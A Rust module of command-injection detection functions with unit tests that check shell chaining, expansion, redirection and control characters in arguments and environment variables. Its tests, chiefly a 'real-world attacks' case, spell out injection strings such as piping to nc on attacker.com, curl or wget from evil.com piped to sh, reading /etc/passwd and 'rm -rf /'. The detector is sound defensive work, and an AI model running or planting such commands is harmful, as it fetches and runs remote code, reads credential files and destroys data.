//! Detection functions for command injection patterns
//!
//! Pure functions that detect dangerous patterns in command arguments,
//! environment variables, and commands themselves.
//!
//! # Design Philosophy
//!
//! Detection functions are **lenient** and may have false positives.
//! This is intentional - security detection should err on the side of caution.
//! Use validation functions for strict enforcement.

use super::types::CommandThreat;

// ============================================================================
// Command Chaining Detection
// ============================================================================

/// Detect semicolon command chaining: `cmd1; cmd2`
#[must_use]
pub fn is_command_chain_present(arg: &str) -> bool {
    arg.contains(';')
}

/// Detect pipe chaining: `cmd1 | cmd2`
#[must_use]
pub fn is_pipe_chain_present(arg: &str) -> bool {
    arg.contains('|')
}

/// Detect background execution: `cmd &`
#[must_use]
pub fn is_background_execution_present(arg: &str) -> bool {
    // Match & not followed by another & (to avoid matching &&)
    let bytes = arg.as_bytes();
    for (i, &byte) in bytes.iter().enumerate() {
        if byte == b'&' {
            // Check if it's not part of &&
            let prev = i.checked_sub(1).and_then(|j| bytes.get(j));
            let next = bytes.get(i.saturating_add(1));

            if prev != Some(&b'&') && next != Some(&b'&') {
                return true;
            }
        }
    }
    false
}

/// Detect conditional chaining: `&&` or `||`
#[must_use]
pub fn is_conditional_chain_present(arg: &str) -> bool {
    arg.contains("&&") || arg.contains("||")
}

/// Detect any command chaining pattern
#[must_use]
pub fn is_any_chain_present(arg: &str) -> bool {
    is_command_chain_present(arg)
        || is_pipe_chain_present(arg)
        || is_background_execution_present(arg)
        || is_conditional_chain_present(arg)
}

// ============================================================================
// Shell Expansion Detection
// ============================================================================

/// Detect command substitution: `$(cmd)` or `` `cmd` ``
#[must_use]
pub fn is_command_substitution_present(arg: &str) -> bool {
    arg.contains("$(") || arg.contains('`')
}

/// Detect variable expansion: `$VAR` or `${VAR}`
#[must_use]
pub fn is_variable_expansion_present(arg: &str) -> bool {
    let bytes = arg.as_bytes();
    for (i, &byte) in bytes.iter().enumerate() {
        if byte == b'$'
            && let Some(&next) = bytes.get(i.saturating_add(1))
        {
            // ${VAR} or $(cmd) - $(cmd) is caught by command_substitution
            if next == b'{' {
                return true;
            }
            // $VAR - starts with letter or underscore
            if next.is_ascii_alphabetic() || next == b'_' {
                return true;
            }
        }
    }
    false
}

/// Detect indirect variable expansion: `${!VAR}`
///
/// Bash indirect expansion allows referencing a variable by name stored in another variable.
/// This is particularly dangerous as it can be used to access arbitrary environment variables.
#[must_use]
pub fn is_indirect_expansion_present(arg: &str) -> bool {
    arg.contains("${!")
}

/// Detect arithmetic expansion: `$((expr))`
///
/// Bash arithmetic expansion evaluates mathematical expressions.
/// This can be abused for side effects in some shells.
#[must_use]
pub fn is_arithmetic_expansion_present(arg: &str) -> bool {
    arg.contains("$((")
}

/// Detect any shell expansion pattern
#[must_use]
pub fn is_shell_expansion_present(arg: &str) -> bool {
    is_command_substitution_present(arg)
        || is_variable_expansion_present(arg)
        || is_indirect_expansion_present(arg)
        || is_arithmetic_expansion_present(arg)
}

// ============================================================================
// Redirection Detection
// ============================================================================

/// Detect output redirection: `>` or `>>`
#[must_use]
pub fn is_output_redirect_present(arg: &str) -> bool {
    arg.contains('>')
}

/// Detect input redirection: `<`
#[must_use]
pub fn is_input_redirect_present(arg: &str) -> bool {
    arg.contains('<')
}

/// Detect any redirection pattern
#[must_use]
pub fn is_redirection_present(arg: &str) -> bool {
    is_output_redirect_present(arg) || is_input_redirect_present(arg)
}

// ============================================================================
// Glob Pattern Detection
// ============================================================================

/// Detect shell glob patterns: `*`, `?`, `[...]`
#[must_use]
pub fn is_glob_present(arg: &str) -> bool {
    // Simple detection - may have false positives for literal * in args
    arg.contains('*') || arg.contains('?') || (arg.contains('[') && arg.contains(']'))
}

// ============================================================================
// Special Character Detection
// ============================================================================

/// Detect null byte injection
#[must_use]
pub fn is_null_byte_present(arg: &str) -> bool {
    arg.contains('\0')
}

/// Detect control characters (ASCII 0-31 except tab, newline, carriage return)
#[must_use]
pub fn is_control_character_present(arg: &str) -> bool {
    arg.chars().any(|c| {
        let code = c as u32;
        code < 32 && code != 9 && code != 10 && code != 13 // Allow tab, LF, CR
    })
}

/// Detect newline injection (LF or CRLF)
///
/// Newlines in command arguments can be used to inject additional commands:
/// - `file\nrm -rf /` would execute two commands
/// - `file\r\necho pwned` same issue with CRLF
#[must_use]
pub fn is_newline_present(arg: &str) -> bool {
    arg.contains('\n') || arg.contains('\r')
}

// ============================================================================
// Environment Variable Detection
// ============================================================================

/// Detect dangerous environment variable names
///
/// Names containing `=`, null bytes, or shell metacharacters are dangerous.
#[must_use]
pub fn is_dangerous_env_name(name: &str) -> bool {
    // Empty names are dangerous
    if name.is_empty() {
        return true;
    }

    // Names with = would set wrong variable
    if name.contains('=') {
        return true;
    }

    // Null bytes
    if name.contains('\0') {
        return true;
    }

    // Shell metacharacters in name
    if name
        .chars()
        .any(|c| matches!(c, ';' | '|' | '&' | '$' | '`' | '(' | ')' | '{' | '}'))
    {
        return true;
    }

    false
}

/// Detect dangerous environment variable values
///
/// Uses the same detection as arguments since env values can be expanded.
#[must_use]
pub fn is_dangerous_env_value(value: &str) -> bool {
    is_dangerous_arg(value)
}

// ============================================================================
// Combined Detection
// ============================================================================

/// Detect any dangerous pattern in an argument
///
/// This is the primary function for checking if an argument is safe.
/// Returns `true` if ANY dangerous pattern is detected.
#[must_use]
pub fn is_dangerous_arg(arg: &str) -> bool {
    is_any_chain_present(arg)
        || is_shell_expansion_present(arg)
        || is_redirection_present(arg)
        || is_glob_present(arg)
        || is_null_byte_present(arg)
        || is_control_character_present(arg)
        || is_newline_present(arg)
}

/// Detect all threats in an argument and return the list
#[must_use]
pub fn detect_threats(arg: &str) -> Vec<CommandThreat> {
    let mut threats = Vec::new();

    if is_command_chain_present(arg) {
        threats.push(CommandThreat::CommandChain);
    }
    if is_pipe_chain_present(arg) {
        threats.push(CommandThreat::PipeChain);
    }
    if is_background_execution_present(arg) {
        threats.push(CommandThreat::BackgroundExecution);
    }
    if is_conditional_chain_present(arg) {
        threats.push(CommandThreat::ConditionalChain);
    }
    if is_command_substitution_present(arg) {
        threats.push(CommandThreat::CommandSubstitution);
    }
    if is_variable_expansion_present(arg) {
        threats.push(CommandThreat::VariableExpansion);
    }
    if is_indirect_expansion_present(arg) {
        threats.push(CommandThreat::IndirectExpansion);
    }
    if is_arithmetic_expansion_present(arg) {
        threats.push(CommandThreat::ArithmeticExpansion);
    }
    if is_output_redirect_present(arg) {
        threats.push(CommandThreat::OutputRedirect);
    }
    if is_input_redirect_present(arg) {
        threats.push(CommandThreat::InputRedirect);
    }
    if is_glob_present(arg) {
        threats.push(CommandThreat::GlobPattern);
    }
    if is_null_byte_present(arg) {
        threats.push(CommandThreat::NullByte);
    }
    if is_control_character_present(arg) {
        threats.push(CommandThreat::ControlCharacter);
    }
    if is_newline_present(arg) {
        threats.push(CommandThreat::NewlineInjection);
    }

    threats
}

/// Detect threats in an environment variable name
#[must_use]
pub fn detect_env_name_threats(name: &str) -> Vec<CommandThreat> {
    let mut threats = Vec::new();

    if is_dangerous_env_name(name) {
        threats.push(CommandThreat::DangerousEnvName);
    }

    threats
}

/// Detect threats in an environment variable value
#[must_use]
pub fn detect_env_value_threats(value: &str) -> Vec<CommandThreat> {
    let mut threats = detect_threats(value);

    // If dangerous, also add the specific env threat
    if !threats.is_empty() {
        threats.push(CommandThreat::DangerousEnvValue);
    }

    threats
}

#[cfg(test)]
mod tests {
    #![allow(clippy::panic, clippy::expect_used)]
    use super::*;

    // Command chaining tests
    #[test]
    fn test_command_chain_detection() {
        assert!(is_command_chain_present("ls; rm -rf /"));
        assert!(is_command_chain_present("cmd;cmd2"));
        assert!(!is_command_chain_present("normal arg"));
    }

    #[test]
    fn test_pipe_chain_detection() {
        assert!(is_pipe_chain_present("cat file | grep pattern"));
        assert!(is_pipe_chain_present("a|b"));
        assert!(!is_pipe_chain_present("normal arg"));
    }

    #[test]
    fn test_background_execution_detection() {
        assert!(is_background_execution_present("cmd &"));
        assert!(is_background_execution_present("malicious&"));
        assert!(!is_background_execution_present("cmd && cmd2")); // && is different
        assert!(!is_background_execution_present("normal arg"));
    }

    #[test]
    fn test_conditional_chain_detection() {
        assert!(is_conditional_chain_present("cmd && cmd2"));
        assert!(is_conditional_chain_present("cmd || cmd2"));
        assert!(is_conditional_chain_present("a&&b||c"));
        assert!(!is_conditional_chain_present("normal arg"));
    }

    // Shell expansion tests
    #[test]
    fn test_command_substitution_detection() {
        assert!(is_command_substitution_present("$(whoami)"));
        assert!(is_command_substitution_present("`whoami`"));
        assert!(is_command_substitution_present("prefix$(cmd)suffix"));
        assert!(!is_command_substitution_present("$VAR")); // Variable, not substitution
        assert!(!is_command_substitution_present("normal arg"));
    }

    #[test]
    fn test_variable_expansion_detection() {
        assert!(is_variable_expansion_present("$HOME"));
        assert!(is_variable_expansion_present("${HOME}"));
        assert!(is_variable_expansion_present("prefix$VAR"));
        assert!(is_variable_expansion_present("$_underscore"));
        assert!(!is_variable_expansion_present("$1")); // Positional param, starts with digit
        assert!(!is_variable_expansion_present("normal arg"));
    }

    #[test]
    fn test_indirect_expansion_detection() {
        assert!(is_indirect_expansion_present("${!VAR}"));
        assert!(is_indirect_expansion_present("${!ref}"));
        assert!(is_indirect_expansion_present("prefix${!indirect}suffix"));
        assert!(!is_indirect_expansion_present("${VAR}")); // Normal expansion
        assert!(!is_indirect_expansion_present("$VAR"));
        assert!(!is_indirect_expansion_present("normal arg"));
    }

    #[test]
    fn test_arithmetic_expansion_detection() {
        assert!(is_arithmetic_expansion_present("$((1+1))"));
        assert!(is_arithmetic_expansion_present("$((x*y))"));
        assert!(is_arithmetic_expansion_present("value$((2**8))"));
        assert!(!is_arithmetic_expansion_present("$(cmd)")); // Command substitution
        assert!(!is_arithmetic_expansion_present("${VAR}"));
        assert!(!is_arithmetic_expansion_present("normal arg"));
    }

    // Redirection tests
    #[test]
    fn test_output_redirect_detection() {
        assert!(is_output_redirect_present("> /etc/passwd"));
        assert!(is_output_redirect_present(">> logfile"));
        assert!(is_output_redirect_present("2>&1"));
        assert!(!is_output_redirect_present("normal arg"));
    }

    #[test]
    fn test_input_redirect_detection() {
        assert!(is_input_redirect_present("< /etc/passwd"));
        assert!(is_input_redirect_present("cmd <input"));
        assert!(!is_input_redirect_present("normal arg"));
    }

    // Glob tests
    #[test]
    fn test_glob_detection() {
        assert!(is_glob_present("*.txt"));
        assert!(is_glob_present("file?.log"));
        assert!(is_glob_present("file[0-9].txt"));
        assert!(!is_glob_present("normal arg"));
    }

    // Special character tests
    #[test]
    fn test_null_byte_detection() {
        assert!(is_null_byte_present("file\0.txt"));
        assert!(!is_null_byte_present("normal arg"));
    }

    #[test]
    fn test_control_character_detection() {
        assert!(is_control_character_present("file\x01.txt")); // SOH
        assert!(is_control_character_present("file\x1B.txt")); // ESC
        assert!(!is_control_character_present("file\t.txt")); // Tab is OK
        assert!(!is_control_character_present("file\n")); // Newline is OK
        assert!(!is_control_character_present("normal arg"));
    }

    // Environment variable tests
    #[test]
    fn test_dangerous_env_name() {
        assert!(is_dangerous_env_name("")); // Empty
        assert!(is_dangerous_env_name("VAR=value")); // Contains =
        assert!(is_dangerous_env_name("VAR\0")); // Null byte
        assert!(is_dangerous_env_name("VAR;cmd")); // Shell metachar
        assert!(is_dangerous_env_name("$(cmd)")); // Command substitution
        assert!(!is_dangerous_env_name("NORMAL_VAR"));
        assert!(!is_dangerous_env_name("PATH"));
    }

    #[test]
    fn test_dangerous_env_value() {
        assert!(is_dangerous_env_value("$(whoami)"));
        assert!(is_dangerous_env_value("value; rm -rf /"));
        assert!(!is_dangerous_env_value("/usr/local/bin"));
        assert!(!is_dangerous_env_value("normal value"));
    }

    // Combined detection tests
    #[test]
    fn test_is_dangerous_arg() {
        // All dangerous patterns
        assert!(is_dangerous_arg("cmd; rm -rf /"));
        assert!(is_dangerous_arg("cmd | cat"));
        assert!(is_dangerous_arg("$(whoami)"));
        assert!(is_dangerous_arg("$HOME"));
        assert!(is_dangerous_arg("> /etc/passwd"));
        assert!(is_dangerous_arg("*.txt"));
        assert!(is_dangerous_arg("file\0.txt"));

        // Safe patterns
        assert!(!is_dangerous_arg("normal-arg"));
        assert!(!is_dangerous_arg("path/to/file.txt"));
        assert!(!is_dangerous_arg("--option=value"));
        assert!(!is_dangerous_arg("-v"));
    }

    #[test]
    fn test_detect_threats_multiple() {
        let threats = detect_threats("$(whoami); rm -rf / | cat");

        assert!(threats.contains(&CommandThreat::CommandSubstitution));
        assert!(threats.contains(&CommandThreat::CommandChain));
        assert!(threats.contains(&CommandThreat::PipeChain));
    }

    #[test]
    fn test_detect_threats_none() {
        let threats = detect_threats("safe-argument");
        assert!(threats.is_empty());
    }

    // Real-world attack patterns
    #[test]
    fn test_real_world_attacks() {
        // Classic command injection
        assert!(is_dangerous_arg("; cat /etc/passwd"));
        assert!(is_dangerous_arg("| nc attacker.com 4444"));
        assert!(is_dangerous_arg("&& curl evil.com/shell.sh | sh"));

        // Environment variable injection
        assert!(is_dangerous_arg("${IFS}cat${IFS}/etc/passwd"));

        // Backtick injection
        assert!(is_dangerous_arg("`wget evil.com/malware`"));

        // Subshell injection
        assert!(is_dangerous_arg("$(curl evil.com|sh)"));
    }
}
